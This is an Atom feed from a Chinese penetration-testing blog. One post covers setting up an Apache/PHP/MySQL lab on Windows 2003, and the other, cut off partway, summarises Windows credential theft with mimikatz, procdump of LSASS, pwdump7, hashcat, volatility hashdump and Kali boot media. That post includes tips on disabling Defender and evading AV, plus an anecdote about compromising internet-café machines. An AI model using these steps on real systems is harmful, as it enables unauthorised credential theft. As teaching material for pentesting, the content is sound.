<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TimeS0ng&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://TimeS0ng.github.io/"/>
  <updated>2018-05-15T13:59:26.023Z</updated>
  <id>http://TimeS0ng.github.io/</id>
  
  <author>
    <name>TimeS0ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin</title>
    <link href="http://TimeS0ng.github.io/2018/05/15/win2003-%E4%B8%8B%E6%90%AD%E5%BB%BAApache2-PHP5-Mysql-phpMyAdmin/"/>
    <id>http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/</id>
    <published>2018-05-15T10:26:18.000Z</published>
    <updated>2018-05-15T13:59:26.023Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><a href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！" class="headerlink" title="&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！"></a>&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到<a href="https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA" target="_blank" rel="external">我的云盘</a>  密码:8r5k，节约大家搜集软件的时间！</h4><a id="more"></a>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
<h2 id="0x01-搭建Apache2-2"><a href="#0x01-搭建Apache2-2" class="headerlink" title="0x01. 搭建Apache2_2"></a>0x01. 搭建Apache2_2</h2><blockquote>
<ol>
<li>运行apache2.2.10-win32-x86-no_ssl.msi</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>一路下一步，到了域名那里随便填一个域名就可以了，接着下一步选择Custom 模式自定义安装</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>然后选择Apache Http Server 2.2.10，再点击change改变安装目录为C:\apm\apache2</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>再一路默认就安装好了，在右下角有apache的图标，到目前为止apache就安装好了</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-安装PHP5"><a href="#0x02-安装PHP5" class="headerlink" title="0x02. 安装PHP5"></a>0x02. 安装PHP5</h2><blockquote>
<ol>
<li>将PHP5 文件夹拖到C:\apm\ 文件夹下</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>将php5 文件下面的php.ini-development 文件修改为php.ini</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开php.ini 将 ; extension_dir = “./“ 修改为extension_dir = “c:\apm\php5\ext”  ; </li>
</ol>
<p>（2）去掉 extension=php_gd2.dll，extension=php_mbstring.dll，extension=php_mysql.dll, extension=php_mysqli.dll 前面的 ; </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开c:\apm\apache2\conf\httpd.conf 配置文件，找到DirectoryIndex index.html，修改为DirectoryIndex index.html index.php login.php</li>
</ol>
<p>（2）找到 #LoadModule vhost_alias_module modules/mod_vhost_alias.so 在这行的后面添加以下内容：</p>
</blockquote>
<p>“””</p>
<p>LoadModule php5_module “c:/apm/php5/php5apache2_2.dll”</p>
<p>AddType application/x-httpd-php .php</p>
<p>PHPIniDir “c:/apm/php5/php.ini”</p>
<p>“””</p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>添加系统环境变量，将 ;c:\apm\php5;c:\apm\php5\ext 加到环境变量后面</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>重启计算机就能看到已经将PHP整合到Apache中了，此时已经可以解析php文件</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装phpMyAdmin"><a href="#0x03-安装phpMyAdmin" class="headerlink" title="0x03. 安装phpMyAdmin"></a>0x03. 安装phpMyAdmin</h2><blockquote>
<p>将phpMyAdmin 文件夹放到c:\apm\apache2\htdocs 文件夹下面，在目录中找到一个名为config.sample.inc.php的文件，将此文件复制一份并命名为config.inc.php，这个文件就是phpMyAdmin的配置文件了，重启apache就可以了</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-安装Mysql"><a href="#0x04-安装Mysql" class="headerlink" title="0x04. 安装Mysql"></a>0x04. 安装Mysql</h2><blockquote>
<ol>
<li>打开mysql-5.5.60-win32.msi ，一路下一步，大致步骤和Apache相似，在“Developer Components（开发者部分）”上左键单击，选择“This feature, and all subfeatures, will be installed on local hard drive.”</li>
</ol>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//WAMP/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。"><a href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。" class="headerlink" title="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。"></a>其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。</h4>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00. 前言&quot;&gt;&lt;/a&gt;0x00. 前言&lt;/h2&gt;&lt;h4 id=&quot;emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！&quot;&gt;&lt;a href=&quot;#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！&quot; class=&quot;headerlink&quot; title=&quot;&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！&quot;&gt;&lt;/a&gt;&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到&lt;a href=&quot;https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;我的云盘&lt;/a&gt;  密码:8r5k，节约大家搜集软件的时间！&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Windows密码抓取总结</title>
    <link href="http://TimeS0ng.github.io/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/"/>
    <id>http://TimeS0ng.github.io/2018/04/20/Windows密码抓取总结/</id>
    <published>2018-04-20T15:39:10.000Z</published>
    <updated>2018-04-20T15:39:35.550Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"><a href="#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。" class="headerlink" title="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"></a>渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</h4><a id="more"></a>
<blockquote>
<p> [本教程具有一定攻击性，仅限于教学使用，不得用于其他用途]</p>
</blockquote>
<h2 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h2><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><a href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）" class="headerlink" title="&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）"></a>&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）</h4><h4 id="emsp-emsp-mimikatz-trunk-emsp-download-here"><a href="#emsp-emsp-mimikatz-trunk-emsp-download-here" class="headerlink" title="&emsp;&emsp;mimikatz_trunk &emsp;// download here"></a>&emsp;&emsp;mimikatz_trunk &emsp;// <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><a href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行" class="headerlink" title="1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)"></a>1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418203056_WR5Aim_Screenshot.jpeg" alt=""></p>
<h4 id="2-紧接着再进入mimikatz，运行命令"><a href="#2-紧接着再进入mimikatz，运行命令" class="headerlink" title="2. 紧接着再进入mimikatz，运行命令"></a>2. 紧接着再进入mimikatz，运行命令</h4><blockquote>
<p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418205101_7Jvn4f_Screenshot.jpeg" alt=""></p>
<blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204329_wHS2Qi_Screenshot.jpeg" alt=""></p>
</blockquote>
<h4 id="3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><a href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文" class="headerlink" title="3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"></a>3. 此时我们就能得到username，password的密文，给大家推荐个<a href="https://www.somd5.com" target="_blank" rel="external">网站-here</a>，这里可以很容易的解密大多数密文</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418204918_4DUANd_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-利用procdump-amp-mimikatz获取密码"><a href="#0x02-利用procdump-amp-mimikatz获取密码" class="headerlink" title="0x02. 利用procdump &amp; mimikatz获取密码"></a>0x02. 利用procdump &amp; mimikatz获取密码</h2><h4 id="实验环境：-1"><a href="#实验环境：-1" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-1-windows-7"><a href="#emsp-emsp-1-windows-7" class="headerlink" title="&emsp;&emsp;1. windows 7"></a>&emsp;&emsp;1. windows 7</h4><h4 id="emsp-emsp-2-procdump-emsp-download-here"><a href="#emsp-emsp-2-procdump-emsp-download-here" class="headerlink" title="&emsp;&emsp;2. procdump &emsp;// download here"></a>&emsp;&emsp;2. procdump &emsp;// <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-3-mimikatz-trunk"><a href="#emsp-emsp-3-mimikatz-trunk" class="headerlink" title="&emsp;&emsp;3. mimikatz_trunk"></a>&emsp;&emsp;3. mimikatz_trunk</h4><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤:"></a>实验步骤:</h4><h4 id="1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）"><a href="#1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）" class="headerlink" title="1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）"></a>1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</h4><blockquote>
<p>C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe  C:\Users\times0ng\Desktop\lsass.dmp</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212206_7LasW4_Screenshot.jpeg" alt=""></p>
<h4 id="2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）"><a href="#2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）" class="headerlink" title="2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）"></a>2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</h4><blockquote>
<p>C:\Users\times0ng\Desktop\mimikatz_trunk\x64\mimikatz.exe</p>
<p>sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</p>
<p>sekurlsa::tspkg</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180418212557_gNzdRI_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-利用pwdump7获取密码"><a href="#0x03-利用pwdump7获取密码" class="headerlink" title="0x03. 利用pwdump7获取密码"></a>0x03. 利用<strong>pwdump7</strong>获取密码</h2><p>实验环境：</p>
<h4 id="emsp-emsp-windows-7"><a href="#emsp-emsp-windows-7" class="headerlink" title="&emsp;&emsp;windows 7"></a>&emsp;&emsp;windows 7</h4><h4 id="emsp-emsp-pwdump7-emsp-download-here"><a href="#emsp-emsp-pwdump7-emsp-download-here" class="headerlink" title="&emsp;&emsp;pwdump7 &emsp;// download here"></a>&emsp;&emsp;<strong>pwdump7</strong> &emsp;// <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-直接用管理员运行cmd，再运行pwdump7-exe"><a href="#1-直接用管理员运行cmd，再运行pwdump7-exe" class="headerlink" title="1. 直接用管理员运行cmd，再运行pwdump7.exe"></a>1. 直接用管理员运行cmd，再运行pwdump7.exe</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419001635_R2mdci_Screenshot.jpeg" alt=""></p>
<h4 id="2-用hashcat直接跑NTLM密码"><a href="#2-用hashcat直接跑NTLM密码" class="headerlink" title="2. 用hashcat直接跑NTLM密码"></a>2. 用hashcat直接跑NTLM密码</h4><blockquote>
<p>hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt –force</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419002119_puCgGq_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-利用虚拟机文件获取密码"><a href="#0x04-利用虚拟机文件获取密码" class="headerlink" title="0x04. 利用虚拟机文件获取密码"></a>0x04. 利用虚拟机文件获取密码</h2><h4 id="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"><a href="#关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！" class="headerlink" title="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks pwdump 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"></a>关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="external"><strong>PowerMemory</strong></a>、<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external"><strong>quarks pwdump </strong></a>等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！</h4><h4 id="接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt"><a href="#接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt" class="headerlink" title="接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 .vmss 和 .vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze 、DumpIt"></a>接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 <em>.vmss 和 </em>.vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="external">Memoryze</a> 、<a href="http://qpdownload.com/dumpit/" target="_blank" rel="external">DumpIt</a></h4><h4 id="实验环境：-2"><a href="#实验环境：-2" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-7-挂起状态"><a href="#emsp-emsp-windows-7-挂起状态" class="headerlink" title="&emsp;&emsp;windows 7 挂起状态"></a>&emsp;&emsp;windows 7 挂起状态</h4><h4 id="emsp-emsp-Vmss2core-emsp-download-here"><a href="#emsp-emsp-Vmss2core-emsp-download-here" class="headerlink" title="&emsp;&emsp;Vmss2core &emsp;// download here"></a>&emsp;&emsp;Vmss2core &emsp;// <a href="https://labs.vmware.com/flings/vmss2core#summary" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-Volatility-emsp-download-here"><a href="#emsp-emsp-Volatility-emsp-download-here" class="headerlink" title="&emsp;&emsp;Volatility  &emsp; // download here"></a>&emsp;&emsp;Volatility  &emsp; // <a href="http://www.volatilityfoundation.org/26" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件"><a href="#1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件" class="headerlink" title="1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件"></a>1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件</h4><blockquote>
<p>./vmss2core-mac64 -W /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmss /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmem </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111752_6vqNIx_Screenshot.jpeg" alt=""></p>
<h4 id="2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址"><a href="#2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址" class="headerlink" title="2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，--profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址"></a>2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，<strong>-</strong>-profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址</h4><blockquote>
<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hivelist -f memory.dmp –profile=Win7SP1x64</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419110839_6RL5dK_Screenshot.jpeg" alt=""></p>
<h4 id="3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"><a href="#3-接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML-hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！" class="headerlink" title="3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！"></a>3. 接下来要做的就是获取对应地址的数据了，记住sys-offset和sam-offset指定的都是虚拟地址，别乱指什么物理地址，可以看到我这里有两个用户账号，它们的NTML hash都被我拿到了，随便找点工具解密就行了，上面也讲过hashcat解密！</h4><blockquote>
<p>./volatility_2.6_mac64_standalone/volatility_2.6_mac64_standalone hashdump -f memory.dmp –profile=Win7SP1x64 sys-offset=0xfffff8a000024010 sam-offset=0xfffff8a000b33010</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419111612_Tkq2jz_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-利用kali-ISO获取密码"><a href="#0x05-利用kali-ISO获取密码" class="headerlink" title="0x05. 利用kali ISO获取密码"></a>0x05. 利用kali ISO获取密码</h2><h4 id="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"><a href="#这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。" class="headerlink" title="这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。"></a>这是笔者最喜欢使用的方法，也是最早掌握的方法，说个题外话：当初我还利用这个方法在网吧免费上网，甚至因为网吧的局域网win7环境我还拿到几台肉鸡shell，不过就是玩玩没干坏事。</h4><h4 id="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"><a href="#在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。" class="headerlink" title="在开始之前我们应该先准备一个USB启动盘，制作方法可以看我以前的文章，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。"></a>在开始之前我们应该先准备一个USB启动盘，制作方法可以看我<a href="https://times0ng.github.io/2018/03/01/kali安装KVM入坑笔记/">以前的文章</a>，不过我现在只是为了演示一下效果就直接使用VM虚拟机插入ISO文件模拟USB启动盘。</h4><h4 id="实验环境：-3"><a href="#实验环境：-3" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10"><a href="#emsp-emsp-windows-10" class="headerlink" title="&emsp;&emsp;windows 10"></a>&emsp;&emsp;windows 10</h4><h4 id="emsp-emsp-kali-ISO-emsp-download-here"><a href="#emsp-emsp-kali-ISO-emsp-download-here" class="headerlink" title="&emsp;&emsp;kali ISO &emsp;// download here"></a>&emsp;&emsp;kali ISO &emsp;// <a href="https://www.kali.org/downloads/" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-3"><a href="#实验步骤：-3" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）"><a href="#1-首先将kali-ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前-）" class="headerlink" title="1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）"></a>1. 首先将kali ISO镜像文件映射到win10虚拟机中（如果你是用USB启动盘插入物理机的话需要先进入BIOS引导界面，然后修改启动顺序，将USB放到硬盘之前 ）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419184849_OuzqV7_Screenshot.jpeg" alt=""></p>
<h4 id="2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可"><a href="#2-然后启动win10就会进入kali的引导界面，我们点击Live-amd-64-即可" class="headerlink" title="2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可"></a>2. 然后启动win10就会进入kali的引导界面，我们点击Live (amd 64) 即可</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//kali安装kvm入坑笔记/20180419185050_jKbLW5_Screenshot.jpeg" alt=""></p>
<h4 id="3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了"><a href="#3-进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到-mnt-目录下，之后对-mnt目录下的操作就相当于对win10进行操作了" class="headerlink" title="3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了"></a>3. 进入kali之后，先查看win10在哪个硬盘（一般就是size最大的那个盘），然后将其挂载到 /mnt 目录下，之后对/mnt目录下的操作就相当于对win10进行操作了</h4><blockquote>
